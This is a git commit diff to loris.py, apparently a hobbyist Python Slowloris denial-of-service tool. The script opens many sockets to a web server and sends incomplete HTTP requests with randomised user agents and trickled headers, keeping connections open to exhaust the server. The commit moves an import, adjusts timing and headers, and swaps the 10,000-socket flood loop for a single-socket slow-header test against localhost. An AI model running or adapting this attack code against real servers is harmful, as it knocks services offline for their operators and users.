1a9c623ab5960acb0b303a1596c0c9fc9f81557f
Richard Antal Nagy <nagy.richard.antal@gmail.com>
2022-05-22 13:49:27 +0200

    Moved random agent selection to randtools from agents

--- loris.py
+++ loris.py
@@ -2,7 +2,7 @@ import socket
 import random
 import time
 
-from agents import random_agent
+from randtools import random_agent
 
 host = "127.0.0.1"
 port = 80
@@ -16,12 +16,14 @@ def send_header(s, header, value):
 
 def create_socket(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(10)
     s.connect((host, port))
     
-    send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1\n")
+    send_line(s, f"GET /?{random.randint(0, 1000000)} HTTP/1.1\n")
     send_header(s, "User-Agent", random_agent())
+    send_header(s, "Accept-language", "en-US,en,q=0.5")
     return s
+
+
 
 def loris(n, host, port, timing):
     # Open sockets
@@ -31,7 +33,7 @@ def loris(n, host, port, timing):
         sockets[i] = create_socket(host, port)
 
     print("Initial sockets opened.")
-    
+
     # Loop keepalive
     while True:
         for s in sockets:
@@ -43,9 +45,21 @@ def loris(n, host, port, timing):
         print(f"Alive: {len(sockets)}/{n}")
 
         for _ in range(n - len(sockets)):
-            sockets.append( create_socket() )
+            sockets.append( create_socket(host, port) )
 
-        time.sleep(timing)
+        time.sleep(3)
         
 if __name__ == '__main__':
-    loris(10000, host, port, timing)
+    #loris(1000, host, port, timing)
+
+    s = create_socket(host, port)
+    time.sleep(3)
+    send_header(s, 'Accept', 'text/html')
+    time.sleep(3)
+    send_header(s, 'Accept-Encoding', '*')
+    time.sleep(3)
+    #send_header(s, f"X-Key-{rand_str(16)}", random.randint(0, 65554))
+    print(s.recv(1024))
+    print('sent')
+    #time.sleep(1)
+        
